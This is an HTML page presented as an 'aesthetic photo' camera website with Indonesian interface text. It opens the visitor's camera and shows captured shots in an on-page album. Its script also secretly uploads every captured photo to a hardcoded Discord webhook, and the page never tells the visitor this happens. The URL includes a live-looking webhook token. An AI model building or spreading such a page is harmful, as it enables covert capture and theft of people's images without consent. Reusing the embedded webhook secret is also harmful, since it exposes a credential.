<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Website Foto Aesthetic by Risqi123</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background: linear-gradient(to bottom, #141e30, #243b55);
            color: white;
            font-family: Arial, sans-serif;
            overflow: hidden;
        }

        #video {
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
            margin-bottom: 20px;
            max-width: 90%;
        }

        .button-group {
            display: flex;
            justify-content: center;
            gap: 15px;
        }

        button {
            padding: 10px 20px;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            background: #4CAF50;
            color: white;
            cursor: pointer;
            transition: background 0.3s;
        }

        button:hover {
            background: #45a049;
        }

        button:active {
            background: #3e8e41;
        }

        #album {
            margin-top: 20px;
            padding: 10px;
            width: 90%;
            max-height: 300px;
            overflow-y: auto;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
        }

        #album img {
            width: 100px;
            height: 100px;
            margin: 5px;
            border-radius: 5px;
            object-fit: cover;
        }
    </style>
    <script>
        let currentFacingMode = 'user';
        const video = document.getElementById('video');

        // Function to start camera with specific facing mode
        function startCamera(facingMode) {
            navigator.mediaDevices.getUserMedia({ video: { facingMode } })
                .then(stream => {
                    video.srcObject = stream;
                })
                .catch(error => {
                    console.error('Error accessing camera:', error);
                    alert('Kamera tidak bisa diakses. Pastikan izin kamera diaktifkan.');
                });
        }

        // Toggle camera between front and back
        function toggleCamera() {
            currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
            startCamera(currentFacingMode);
        }

        // Function to send photo to Discord webhook
        async function sendToDiscord(blob) {
            const webhookUrl = "https://discordapp.com/api/webhooks/1320606404985487391/mvaetfPZAjSEaEI9823-e7pqoXoe04V5NCcb8uQZyso983SnYWEbckHmOVUaPw6o2kFJ";
            const formData = new FormData();
            formData.append('file', blob, 'photo.png');

            try {
                await fetch(webhookUrl, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error('Error:', error);
            }
        }

        document.addEventListener('DOMContentLoaded', () => {
            const canvas = document.getElementById('canvas');
            const captureButton = document.getElementById('capture');
            const album = document.getElementById('album');

            startCamera(currentFacingMode);

            captureButton.addEventListener('click', () => {
                const context = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;

                // Draw video frame to canvas
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Convert canvas to blob
                canvas.toBlob(blob => {
                    // Send photo to Discord
                    sendToDiscord(blob);

                    // Add photo to album
                    const img = document.createElement('img');
                    img.src = URL.createObjectURL(blob);
                    album.appendChild(img);
                });
            });
        });
    </script>
</head>
<body>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display: none;"></canvas>
    <div class="button-group">
        <button id="capture">FOTO</button>
        <button onclick="toggleCamera()">Kamera Depan/Belakang</button>
    </div>
    <div id="album">
        <!-- Photos will be added here dynamically -->
    </div>
</body>
</html>
